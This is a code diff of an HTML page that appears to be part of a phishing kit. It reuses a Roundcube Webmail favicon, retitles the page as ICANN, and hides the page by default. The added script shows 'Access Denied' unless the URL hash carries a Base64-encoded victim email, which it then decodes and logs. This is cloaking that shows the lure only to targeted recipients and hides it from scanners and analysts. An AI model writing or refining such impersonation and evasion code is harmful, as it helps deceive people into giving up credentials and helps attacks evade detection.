@@ -1,11 +1,16 @@
 <!DOCTYPE html>
 <html>
   <head>
+  <style>
+    html {
+        visibility: hidden; 
+        background: white;
+    }
+</style>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
 <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
-<!-- <link rel="shortcut icon" href="https://mail.um.si/owa/auth/15.2.1544/themes/resources/favicon.ico"> -->
-<link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317"><title>Roundcube Webmail</title>
+<link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317"><title>Internet Corporation for Assigned Names and Numbers (ICANN)</title>
 
     <script>
       var data = getParameter();
@@ -49,35 +54,48 @@ return false; }
 else {
 return true;
 }});
-function getQueryParamsAndHash() {
-    let params = {};
-    let hash = window.location.hash.substring(1); // Remove the #
 
-    // If there's no hash in the URL, deny access
-    if (!hash) {
-        document.body.innerHTML = "<h1>Access Denied</h1>";
-        return;
+document.addEventListener("DOMContentLoaded", function () {
+    function isValidBase64Email(encodedString) {
+        try {
+            let decoded = atob(encodedString);
+            let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(decoded) ? decoded : null;
+        } catch (e) {
+            return null; 
+        }
     }
 
-    // Extract query parameters
-    let queryString = window.location.search.substring(1);
-    let queryArray = queryString.split("&");
+    function enforceAccessRestriction() {
+        let hash = window.location.hash.substring(1); 
 
-    queryArray.forEach(param => {
-        let [key, value] = param.split("=");
-        if (key) {
-            params[decodeURIComponent(key)] = decodeURIComponent(value || "");
+        let decodedEmail = isValidBase64Email(hash);
+        if (!decodedEmail) {
+            document.body.innerHTML = ""; 
+            document.body.style.cssText = `
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                flex-direction: column;
+                text-align: center;
+                background-color: white;
+                color: black;
+                font-family: Arial, sans-serif;
+                margin: 0;
+            `;
+            let deniedMessage = document.createElement("div");
+            deniedMessage.innerHTML = `
+                <h1 style="color: red;">Access Denied</h1>
+                <p>You must include a valid Base64-encoded email in the URL hash.</p>
+            `;
+            document.body.appendChild(deniedMessage);
+            return;
         }
-    });
-
-    return { params, hash };
-}
-
-// Example usage
-let data = getQueryParamsAndHash();
-if (data) {
-    console.log(data);
-}
+        console.log("Decoded Email:", decodedEmail);
+    }
+    enforceAccessRestriction();
+});
 	</script>
   </head>
 </html>
